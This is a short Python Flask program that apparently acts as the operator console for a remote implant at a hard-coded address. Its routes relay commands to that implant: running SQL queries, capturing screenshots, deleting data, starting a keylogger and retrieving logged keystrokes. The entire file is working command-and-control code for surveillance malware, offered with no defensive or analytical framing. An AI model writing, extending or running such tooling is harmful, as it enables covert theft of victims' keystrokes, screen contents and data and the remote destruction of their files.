from flask import Flask
from flask import request as flask_request
from flask import Response
import requests
from urllib.parse import urljoin
from utils import *

# Host and port of the implant
IMPLANT_HOST = '192.168.20.21'
IMPLANT_PORT = 5000

# Base URL to send requests to implant
IMPLANT_URL = f"http://{IMPLANT_HOST}:{IMPLANT_PORT}"

app = Flask(__name__)

# Send commands to implant
@app.route('/sql', methods=['GET', 'POST'])
def send_sql():
    query = flask_request.args.get('parameter')
    ret = requests.post(urljoin(IMPLANT_URL, "/sql"), params={"parameter": query})
    print(ret.text)
    return ret.text 

@app.post('/shot')
def send_screenshot():
    res = requests.get(urljoin(IMPLANT_URL, "/shot"))
    img_data = res.content
    return Response(img_data, mimetype="image/png")

@app.post('/delete')
def send_delete():
    jsonBody = flask_request.get_json()
    res = requests.post(urljoin(IMPLANT_URL, "/delete"), headers={'Content-type':'application/json'}, json=jsonBody)
    print(res.content)
    return "Success"

@app.post('/key')
def send_keylog():
    res = requests.post(urljoin(IMPLANT_URL, "/key"))
    return res.content

@app.get('/getkeylogger')
def get_keylog_data():
    res = requests.get(urljoin(IMPLANT_URL, "/getkeylogger"))
    data = res.content
    return data

# Start app
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=9000)
